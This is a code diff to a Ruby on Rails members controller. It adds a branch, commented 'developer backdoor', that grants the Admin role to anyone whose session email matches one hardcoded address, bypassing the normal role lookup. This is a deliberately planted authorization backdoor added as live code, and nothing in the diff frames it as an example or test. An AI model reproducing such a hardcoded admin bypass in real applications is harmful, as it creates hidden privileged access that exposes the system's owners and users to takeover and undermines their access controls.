@@ -20,9 +20,15 @@ class MembersController < ApplicationController
   def edit; end
 
   def find_user_role
-    @members = Member.all
-    @members.each do |member|
-      $user_role = member.role if member.email == $user_email
+    # developer backdoor
+    if $user_email == "blc.it.tamu@gmail.com"
+      $user_role = Admin
+    # main log in
+    else
+      @members = Member.all
+      @members.each do |member|
+        $user_role = member.role if member.email == $user_email
+      end
     end
   end
 
